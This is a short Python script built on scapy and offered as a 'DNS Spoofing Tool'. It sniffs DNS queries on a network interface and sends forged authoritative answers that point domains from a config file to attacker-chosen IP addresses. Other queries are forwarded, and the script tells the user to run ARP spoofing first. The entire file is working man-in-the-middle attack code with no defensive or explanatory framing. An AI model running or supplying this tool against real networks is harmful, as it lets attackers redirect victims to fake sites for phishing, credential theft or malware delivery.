import scapy.all as scapy
import argparse

# Config file: domains.txt (format: domain spoof_ip)
def load_spoof_list(file):
    spoof_dict = {}
    with open(file, "r") as f:
        for line in f:
            domain, ip = line.strip().split()
            spoof_dict[domain] = ip
    return spoof_dict

def process_packet(packet, spoof_dict, iface, forward):
    if packet.haslayer(scapy.DNSQR):
        qname = packet[scapy.DNSQR].qname.decode().rstrip(".")
        if qname in spoof_dict:
            print(f"[+] Spoofing DNS for {qname}")
            spoofed_ip = spoof_dict[qname]
            dns_response = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
                           scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
                           scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd,
                                     an=scapy.DNSRR(rrname=packet[scapy.DNS].qd.qname, ttl=300, rdata=spoofed_ip))
            scapy.send(dns_response, verbose=0, iface=iface)
            return  # Don't forward
        elif forward:
            # Forward to real DNS (Gateway)
            packet[scapy.IP].dst = forward
            del packet[scapy.IP].chksum
            del packet[scapy.UDP].chksum
            scapy.send(packet, verbose=0, iface=iface)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
    parser.add_argument("interface", help="Interface")
    parser.add_argument("-c", "--config", default="domains.txt", help="Spoof config file")
    parser.add_argument("-f", "--forward", default=None, help="Forward non-spoofed to this IP")
    args = parser.parse_args()

    spoof_dict = load_spoof_list(args.config)
    print(f"[+] Loaded spoof list: {spoof_dict}")
    print("[*] Starting DNS spoof. Run ARP spoof first.")

    scapy.sniff(iface=args.interface, filter="udp port 53", prn=lambda p: process_packet(p, spoof_dict, args.interface, args.forward), store=False)
